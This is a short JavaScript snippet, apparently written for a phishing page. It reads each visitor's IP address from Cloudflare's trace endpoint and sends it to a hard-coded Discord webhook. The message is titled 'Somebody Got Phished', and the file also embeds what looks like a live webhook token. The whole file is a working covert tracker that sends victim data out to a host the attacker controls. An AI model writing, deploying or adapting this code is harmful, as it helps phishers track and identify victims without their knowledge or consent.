// Replace with your Discord webhook URL
const webhookURL =
  "https://discord.com/api/webhooks/1283875492973248595/_PAtLBSg3Tn5_zUg7LMktzSejReNgeXcGTGH_PhsAMQaiSIjJjZns6i9PEmLyF-21miR";

// Function to send error messages to Discord
function sendErrorToDiscord(errorMessage) {
  const errorEmbed = {
    embeds: [
      {
        title: "Error in Visitor Info Logging",
        description: errorMessage,
        color: 15158332, // Red color
        timestamp: new Date(),
      },
    ],
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(errorEmbed),
  })
    .then(() => console.log("Error message sent to Discord"))
    .catch((err) =>
      console.error("Failed to send error to Discord: ", err)
    );
}

// Fetch IP using Cloudflare's Trace
fetch("https://www.cloudflare.com/cdn-cgi/trace")
  .then((response) => {
    if (!response.ok) {
      throw new Error(`API responded with status ${response.status}`);
    }
    return response.text();
  })
  .then((data) => {
    // Parse the response to extract the IP
    const ip = data
      .split("\n")
      .find((line) => line.startsWith("ip="))
      ?.split("=")[1];

    if (!ip) {
      throw new Error("Failed to extract IP address");
    }

    // Prepare Discord embed
    const embed = {
      embeds: [
        {
          title: "Somebody Got Phished",
          color: 15158332, // Blue color
          fields: [{ name: "IP Address", value: ip, inline: true }],
          image : {url:"https://tenor.com/view/breezy-hacker-im-in-matrix-laptop-gif-22983973"},
          timestamp: new Date(),
        },
      ],
    };

    // Send data to Discord webhook
    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed),
    })
      .then(() => console.log("Visitor IP sent to Discord"))
      .catch((err) => {
        console.error("Error sending to Discord: ", err);
        sendErrorToDiscord(`Failed to send visitor IP to Discord: ${err.message}`);
      });
  })
  .catch((err) => {
    console.error("Error fetching IP: ", err);
    sendErrorToDiscord(`Failed to fetch IP address: ${err.message}`);
  });
